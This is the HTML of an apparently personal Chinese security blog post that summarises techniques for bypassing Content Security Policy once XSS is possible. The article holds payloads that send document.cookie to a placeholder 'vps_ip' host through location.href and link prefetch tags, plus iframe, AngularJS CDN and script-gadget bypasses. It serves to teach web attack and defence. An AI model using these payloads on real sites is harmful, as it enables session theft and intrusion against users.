@@ -1,0 +1,255 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CSP绕过思路总结 | h0ld1rs的随手记</title><meta name="author" content="h0ld1rs"><meta name="copyright" content="h0ld1rs"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="对csp的一些总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSP绕过思路总结">
+<meta property="og:url" content="https://h0ld1rs.github.io/2021/06/15/XSS/CSP%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="h0ld1rs的随手记">
+<meta property="og:description" content="对csp的一些总结">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://h0ld1rs.github.io/img/%E5%9B%BE%E5%BA%93/25.jpg">
+<meta property="article:published_time" content="2021-06-15T07:08:21.000Z">
+<meta property="article:modified_time" content="2021-06-15T09:09:30.223Z">
+<meta property="article:author" content="h0ld1rs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://h0ld1rs.github.io/img/%E5%9B%BE%E5%BA%93/25.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://h0ld1rs.github.io/2021/06/15/XSS/CSP%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: true
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-06-15 17:09:30'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/%E5%9B%BE%E5%BA%93/25.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h0ld1rs的随手记</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">CSP绕过思路总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-06-15T07:08:21.000Z" title="发表于 2021-06-15 15:08:21">2021-06-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-06-15T09:09:30.223Z" title="更新于 2021-06-15 17:09:30">2021-06-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CSP简介"><a href="#CSP简介" class="headerlink" title="CSP简介"></a>CSP简介</h1><p>CSP即内容安全策略，是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击，和数据注入等，这些攻击可以实现数据窃取，网站破坏和作为恶意软件分发版本等行为，该策略可让网站管理员指定客户端允许加载的各类可信任资源。</p>
+<p>当代网站太容易收到XSS的攻击，CSP就是一个统一的防止网站收到XSS攻击的防御方法。CSP是一种白名单策略，当有从非白名单允许的JS脚本出现在页面中，浏览器会阻止脚本的运行。</p>
+<h1 id="CSP的绕过"><a href="#CSP的绕过" class="headerlink" title="CSP的绕过"></a>CSP的绕过</h1><p>前端的安全人员一直热衷CSP</p>
+<h2 id="location-href"><a href="#location-href" class="headerlink" title="location.href"></a>location.href</h2><p>CSP不影响location.href跳转，因为当今大部分网站的跳转功能都是由前端实现的，CSP如果限制跳转，会很影响很多网站的功能，所以，用跳转来绕过CSP获取数据是一个万能的办法，虽然比较容易被发现，但是大部分情况下，已经足够。</p>
+<p>当我们已经能执行JS脚本的时候，由于CSP的设置，我们的Cookie无法外带传输，就可以采用此方法，将cookie打到我们的vps上</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">&quot;&quot;</span>vps_ip:xxxx?<span class="string">&quot;&quot;</span>+<span class="built_in">document</span>.cookie</span><br></pre></td></tr></table></figure>
+
+<p><code>利用条件：可以执行任意JS脚本，但是由于CSP，无法将数据外带</code></p>
+<h2 id="link标签导致的绕过"><a href="#link标签导致的绕过" class="headerlink" title="link标签导致的绕过"></a>link标签导致的绕过</h2><p>这个方法比较老，当时还没有限制此标签，但是现在浏览器大部分都限制了此标签，但是老的浏览器应该还是可行的。所以我们可以通过此标签将数据带外。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- firefox --&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;dns-prefetch&quot;</span> href=<span class="string">&quot;//$&#123;cookie&#125;.vps_ip&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- chrome --&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;prefetch&quot;</span> href=<span class="string">&quot;//vps_ip?$&#123;cookie&#125;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当然这是我们写死的标签，如何把数据外带？</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> link = <span class="built_in">document</span>.creatElement(<span class="string">&quot;link&quot;</span>);</span><br><span class="line">link.setAttribute(<span class="string">&quot;rel&quot;</span>,<span class="string">&quot;prefetch&quot;</span>);</span><br><span class="line">link.setAttribute(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;//vps_ip?&quot;</span>+<span class="built_in">document</span>.cookies);</span><br><span class="line"><span class="built_in">document</span>.head.appendChild(link);</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以把cookie带外了</p>
+<p><code>利用条件：可以执行任意JS脚本，但是由于CSP无法外带数据库</code></p>
+<h2 id="使用iframe绕过"><a href="#使用iframe绕过" class="headerlink" title="使用iframe绕过"></a>使用iframe绕过</h2><p>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护的B页面，那么，如果B页存在XSS漏洞，我们可以直接在B页面创建<code>iframe</code>，用<code>javascript</code>直接操作A页面的DOM，可以说A页面的CSP完去失效。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- A页面 --&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Security-Policy&quot;</span> content=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1 id=<span class="string">&quot;flag&quot;</span>&gt;flag&#123;<span class="number">0xffff</span>&#125;&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- B页面 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 下面模拟XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="javascript">iframe.src=<span class="string">&quot;A页面&quot;</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line"><span class="javascript"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>alert(iframe.contentWindow.document.getElementById(<span class="string">&#x27;flag&#x27;</span>).innerHTML),<span class="number">1000</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>setTimeout</code>是为了等待iframe加载完成。</p>
+<p>利用条件：</p>
+<p><code>1.一个同源站点存在两个页面，一个页面在CSP保护，另一个页面没有CSP保护，且存在XSS漏洞</code></p>
+<p><code>2.需要的数据在CSP保护的页面</code></p>
+<h2 id="用CDN来绕过"><a href="#用CDN来绕过" class="headerlink" title="用CDN来绕过"></a>用CDN来绕过</h2><p>一般来说，前端用到的许多框架和库，部分企业为了减轻服务器压力或者其他原因，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，可能就存在绕过CSP的风险。</p>
+<p>这里给出orange师傅绕hackmd CSP的文章 <a target="_blank" rel="noopener" href="https://paper.seebug.org/855/">Hackmd XSS</a></p>
+<p>案例中hackmd中CSP引用了cloudflare.com CDN服务，于是师傅采用了低版本的angular js模板注入来绕过csp，如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Security-Policy&quot;</span> content=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://cdnjs.cloudflare.com;&quot;</span>&gt;</span><br><span class="line">&lt;!-- foo=<span class="string">&quot;--&gt;</span></span><br><span class="line"><span class="string">&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;div ng-app&gt;</span></span><br><span class="line"><span class="string">    &#123;&#123;constructor.constructor(&#x27;alert(document.cookie)&#x27;)()&#125;&#125;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>正如<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f1de775bc43e%E6%89%80%E8%AF%B4">https://www.jianshu.com/p/f1de775bc43e所说</a></p>
+<p>如果用了<code>Jquery-mobile的库</code>，且CSP中包含<code>script--src</code>,<code>unsafe-eval</code>或者<code>script-src</code>,<code>strict-dymatic</code>可以用此exp</p>
+<p><code>&lt;div data-role=popup id=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;&lt;/div&gt;</code></p>
+<p><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a></p>
+<p>利用条件：</p>
+<ol>
+<li>CDN服务商存在某些低版本的js库</li>
+<li>此CDN在CSP的白名单中</li>
+</ol>
+<h2 id="站点可控资源静态绕过"><a href="#站点可控资源静态绕过" class="headerlink" title="站点可控资源静态绕过"></a>站点可控资源静态绕过</h2><p>给一个绕过codimd的(实例)<a target="_blank" rel="noopener" href="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md">codimd xss</a><br>案例中codimd的CSP中使用了<code>www.google-analytics.com</code><br>而<a target="_blank" rel="noopener" href="http://www.google.analytics.com中提供了自定义javascript的功能(google会封装自定义的js,所以还需要unsafe-eval),于是可以绕过csp/">www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP</a></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094532-76da0170-738e-1.png" alt="img"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Security-Policy&quot;</span> content=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://www.google-analytics.com&quot;</span>&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094532-76e2f1a4-738e-1.png" alt="img"></p>
+<p>同理，如果其他站点下提供了可控静态资源得到功能，且CSP中允许出现此站点，则可以采用此方式绕过</p>
+<p>利用条件：</p>
+<ol>
+<li>此站点在可控静态资源</li>
+<li>站点在CSP白名单中</li>
+</ol>
+<h2 id="站点可控JSOP绕过"><a href="#站点可控JSOP绕过" class="headerlink" title="站点可控JSOP绕过"></a>站点可控JSOP绕过</h2><p><strong>JSONP的详细介绍</strong><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4470">https://xz.aliyun.com/t/4470</a></p>
+<p>师傅的博客</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4470">https://xz.aliyun.com/t/4470</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5084#toc-0">https://xz.aliyun.com/t/5084#toc-0</a></p>
+<p>常用加载：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f1de775bc43e">https://www.jianshu.com/p/f1de775bc43e</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">h0ld1rs</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://h0ld1rs.github.io/2021/06/15/XSS/CSP%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/">https://h0ld1rs.github.io/2021/06/15/XSS/CSP%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://h0ld1rs.github.io" target="_blank">h0ld1rs的随手记</a>！</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/%E5%9B%BE%E5%BA%93/25.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/06/15/CTF%E9%A2%98%E7%9B%AE/Easy-Java/"><img class="prev-cover" src="/img/%E5%9B%BE%E5%BA%93/26.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Easy_Java</div></div></a></div><div class="next-post pull-right"><a href="/2021/06/07/CTF%E9%A2%98%E7%9B%AE/EasySearch/"><img class="next-cover" src="/img/%E5%9B%BE%E5%BA%93/23.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">EasySearch</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">h0ld1rs</div><div class="author-info__description">博主笨的离谱，希望各位佬们多包含</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h0ld1rs"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/h0ld1rs/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:yumeibumei@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSP%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">CSP简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSP%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">CSP的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#location-href"><span class="toc-number">2.1.</span> <span class="toc-text">location.href</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#link%E6%A0%87%E7%AD%BE%E5%AF%BC%E8%87%B4%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.</span> <span class="toc-text">link标签导致的绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8iframe%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.</span> <span class="toc-text">使用iframe绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8CDN%E6%9D%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text">用CDN来绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%99%E7%82%B9%E5%8F%AF%E6%8E%A7%E8%B5%84%E6%BA%90%E9%9D%99%E6%80%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.5.</span> <span class="toc-text">站点可控资源静态绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%99%E7%82%B9%E5%8F%AF%E6%8E%A7JSOP%E7%BB%95%E8%BF%87"><span class="toc-number">2.6.</span> <span class="toc-text">站点可控JSOP绕过</span></a></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/hello-world/" title="Hello World"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2021/07/31/hello-world/" title="Hello World">Hello World</a><time datetime="2021-07-31T14:18:47.559Z" title="发表于 2021-07-31 22:18:47">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/XSS/%E4%B8%89%E7%A7%8Dxss%E7%9A%84%E5%8C%BA%E5%88%AB/" title="三种xss的区别"><img src="/img/image/%20.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="三种xss的区别"/></a><div class="content"><a class="title" href="/2021/07/31/XSS/%E4%B8%89%E7%A7%8Dxss%E7%9A%84%E5%8C%BA%E5%88%AB/" title="三种xss的区别">三种xss的区别</a><time datetime="2021-07-31T13:23:29.000Z" title="发表于 2021-07-31 21:23:29">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/Cookie/" title="Cookie"><img src="/img/image/1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cookie"/></a><div class="content"><a class="title" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/Cookie/" title="Cookie">Cookie</a><time datetime="2021-07-31T13:22:32.000Z" title="发表于 2021-07-31 21:22:32">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/SQL%E6%B3%A8%E5%85%A5/%E9%A2%84%E7%BC%96%E8%AF%91/" title="预编译"><img src="/img/image/19.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="预编译"/></a><div class="content"><a class="title" href="/2021/07/31/SQL%E6%B3%A8%E5%85%A5/%E9%A2%84%E7%BC%96%E8%AF%91/" title="预编译">预编译</a><time datetime="2021-07-31T13:19:28.000Z" title="发表于 2021-07-31 21:19:28">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/LDAP/" title="LDAP"><img src="/img/image/%20.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="LDAP"/></a><div class="content"><a class="title" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/LDAP/" title="LDAP">LDAP</a><time datetime="2021-07-31T13:17:25.000Z" title="发表于 2021-07-31 21:17:25">2021-07-31</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/%E5%9B%BE%E5%BA%93/25.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By h0ld1rs</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script 